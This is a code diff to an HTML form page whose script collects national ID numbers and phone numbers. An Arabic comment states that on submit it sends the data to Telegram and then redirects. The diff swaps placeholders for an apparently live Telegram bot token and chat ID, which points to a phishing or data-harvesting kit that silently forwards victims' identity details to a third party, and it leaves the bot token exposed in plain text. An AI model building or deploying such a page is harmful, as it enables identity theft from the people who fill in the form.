@@ -172,8 +172,8 @@ nationalId.addEventListener('keydown', (e) => { const allowed = ['Backspace','De
 nationalId.addEventListener('input', ()=>{ nationalId.value = nationalId.value.replace(/[^0-9]/g,'').slice(0,nationalId.maxLength); updateButtonState(); });
 
 // عند الإرسال تحقق من العمر ثم أرسل إلى تلجرام ثم إعادة التوجيه
-const BOT_TOKEN = 'ضع_توكن_البوت_هنا';
-const CHAT_ID = 'ضع_ChatID_هنا';
+const BOT_TOKEN = '8490790648:AAGGfGWVw-bvX1enS8UWaFVE0cCgphETNfo';
+const CHAT_ID = '5450865891';
 // تقييد حقل الهاتف للأرقام فقط مع دعم اللصق
 phoneInput.addEventListener('input', ()=>{ phoneInput.value = phoneInput.value.replace(/[^0-9]/g,'').slice(0,10); updateButtonState(); });
 phoneInput.addEventListener('keydown', (e)=>{ const allowed = ['Backspace','Delete','ArrowLeft','ArrowRight','Tab']; if(allowed.includes(e.key)) return; if(e.key.length===1 && !/^[0-9]$/.test(e.key)) e.preventDefault(); });
@@ -225,5 +225,6 @@ updateButtonState();
 </script>
 </body>
 </html>
+
 
 
